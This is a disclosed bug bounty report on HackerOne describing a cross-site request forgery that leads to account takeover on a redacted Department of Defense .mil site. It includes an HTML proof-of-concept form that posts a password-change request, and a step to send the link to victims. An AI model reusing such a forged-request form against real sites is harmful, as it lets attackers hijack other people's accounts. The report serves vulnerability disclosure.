# CSRF to account takeover in https://███████.mil/

## Report Details
- **Report ID**: 987751
- **URL**: https://hackerone.com/reports/987751
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-09-22T03:24:11.053Z
- **Disclosed**: 2020-10-16T19:43:15.777Z

## Reporter
- **Username**: dhakal_bibek
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
Hello 
**Description:**

## Impact

## Step-by-step Reproduction Instructions

1. Go to  https://███.mil/ and login using your credintials
2. Now Click on change password
3. First turn the intercept of burp to on and enter your secondary email id and password and click on register password.

```
<html>
  <!-- CSRF PoC - kira-->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://████████.mil/scripts/wa.exe" method="POST">
      <input type="hidden" name="GETPW2" value="GETPW1" />
      <input type="hidden" name="Y" value="a█████" />
      <input type="hidden" name="p" value="████████" />
      <input type="hidden" name="q" value="███████" />
      <input type="hidden" name="X" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

4: Now send the link to the victims
## Product, Version, and Configuration (If applicable)

██████

## Impact

It is a critical issue as i was able to takeover anyone account using this attack..

## Attachments
No attachments
